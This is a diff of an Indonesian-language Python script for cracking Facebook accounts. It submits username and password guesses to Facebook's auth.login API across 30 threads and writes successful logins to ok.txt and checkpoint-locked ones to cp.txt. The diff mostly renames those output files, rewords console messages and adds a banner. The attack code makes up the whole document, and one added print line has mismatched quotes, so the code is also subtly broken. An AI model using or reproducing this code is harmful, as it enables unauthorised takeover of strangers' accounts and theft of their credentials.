@@ -120,27 +120,27 @@ def moch_yayan():
              api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
              if 'EAA' in response.text:
-                 print(f"\r\033[1;97m [\033[1;92m✓\033[1;97m] \033[1;37m{username}\033[94m|\033[1;37m{password}                       ",end="")
+                 print(f"\r\033[1;92m * ---> {username}|{password}                       ",end="")
                  print()
                  result += 1
                  if cek:
                         life.append(username+"|"+password)
                  else:
-                        with open('hack.txt','a') as f:
+                        with open('ok.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
              elif 'www.facebook.com' in response.json()['error_msg']:
-                   print(f"\r\033[1;97m [\033[1;93m×\033[1;97m] \033[1;37m{username}\033[94m|\033[1;37m{password}                    ",end="")
+                   print(f"\r\033[1;93m * ---> {username}|{password}                    ",end="")
                    print()
                    check += 1
                    if cek:
                            chek.append(username+"|"+password)
                    else:
-                           with open('check.txt','a') as f:
+                           with open('cp.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
              else:
                    die += 1
              for i in list('\|/-•'):
-                            print(f"\n\r\033[00m [\033[1;91m{i}\033[00m] hacked : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;94m{str(die)}\033[90m)\033[00m",end="")
+                            print(f"\n\r\033[00m [\033[1;91m{i}\033[00m] ok : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcp : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;94m{str(die)}\033[90m)\033[00m",end="")
                             time.sleep(0.2)
          def getid(url):
              raw = requests.get(url,cookies=kuki).content
@@ -274,8 +274,8 @@ def moch_yayan():
                                  exit("\033[00m[\033[91m!\033[00m] \033[97mUsername/ID Tidak Ada!")
                    elif memek == '6' or memek =='06':
                          try:
-                                 file1 = open("check.txt").read()
-                                 file2 = open("hack.txt").read()
+                                 file1 = open("cp.txt").read()
+                                 file2 = open("ok.txt").read()
                                  a = file1 + file2
                                  final = a.strip().split("\n")
                                  final = set(final)
@@ -284,17 +284,17 @@ def moch_yayan():
                                          for user in final:
                                                  a = user.split("|")
                                                  ex.submit(login,(a[0]),(a[1]),(True))
-                                 os.remove("check.txt")
-                                 os.remove("hack.txt")
+                                 os.remove("cp.txt")
+                                 os.remove("ok.txt")
                                  for x in life:
-                                         with open('hack.txt','a') as f:
+                                         with open('ok.txt','a') as f:
                                                  f.write(x+'\n')
                                  for x in chek:
-                                         with open('check.txt','a') as f:
+                                         with open('cp.txt','a') as f:
                                                  f.write(x+"\n")
 
                                  print("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] Crack Selesai....")
-                                 print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] Saved To \033[1;93mcheck.txt\033[96m|\033[1;92mhack.txt")
+                                 print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] Saved To \033[1;93mcp.txt\033[96m|\033[1;92mok.txt")
                          except FileNotFoundError:
                                  exit("\n\033[00m[\033[91m!\033[00m] Kamu Tidak Mendapatkan Hasil")
                    else:
@@ -308,7 +308,14 @@ def moch_yayan():
                    expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Password Tambahan1 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Password Tambahan2 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Password Tambahan3 \033[1;91m: \033[1;92m")
-                   aahh('\x1b[1;94m────────────────────────────────────────────────────')
+                   aahh('\x1b[1;94m────────────────────────────────────────────────────\n')
+                   ikeh_ikeh_kimochi()
+                   jembut()
+                   print('\n\x1b[1;92m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
+                   print('\x1b[1;97m     疊╔═╦═────••♽••─────═╦═╗疊')
+                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")
+                   print('\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] hasil\x1b[1;92m OK\x1b[1;97m di simpan ke : ok.txt\n [\x1b[1;93m-\x1b[1;97m] hasil\x1b[1;93m CP\x1b[1;97m di simpan ke : cp.txt')
+                   print('\n [\x1b[1;91m!\x1b[1;97m] matikan mode data untuk menjeda proses crack')
                    with ThreadPoolExecutor(max_workers=30) as ex:
                           for user in username:
                                   users = user.split('|')
@@ -324,19 +331,11 @@ def moch_yayan():
                                                   ex.submit(login,(users[1]),(passw))
                    if check != 0 or result != 0:
                            time.sleep(0.1)
-                           print("\n\n\x1b[1;94m────────────────────────────────────────────────────")
-                           print("\x1b[1;97m [\x1b[1;94m•\x1b[1;97m] Crack Selesai...")
-                           print("\x1b[1;97m [\x1b[1;94m✓\x1b[1;97m] Hacked     \x1b[1;94m: \033[92mhack.txt")
-                           print("\x1b[1;97m [\x1b[1;91m×\x1b[1;97m] Checkpoint \x1b[1;94m: \033[93mcheck.txt")
-                           print("\x1b[1;94m────────────────────────────────────────────────────")
-                   
+                           print("\n\n\x1b[1;96m *\x1b[1;92m finished")
                    else:
                            time.sleep(0.1)
-                           print("\n\n\x1b[1;94m────────────────────────────────────────────────────")
-                           print("\x1b[1;97m [\x1b[1;94m•\x1b[1;97m] Crack Selesai...")
-                           print("\x1b[1;97m [\x1b[1;91m×\x1b[1;97m] Tidak ada hasil")
-                           print("\x1b[1;94m────────────────────────────────────────────────────")
-               except (KeyboardInterrupt,EOFError):
+                           print("\n\n\x1b[1;96m *\x1b[1;97m kamu tidak mendapatkan hasil:(')
+                except (KeyboardInterrupt,EOFError):
                        exit()
                except requests.exceptions.ConnectionError:
                        exit("\n\n\033[00m  [\033[91m!\033[00m] Tidak Ada Koneksi")
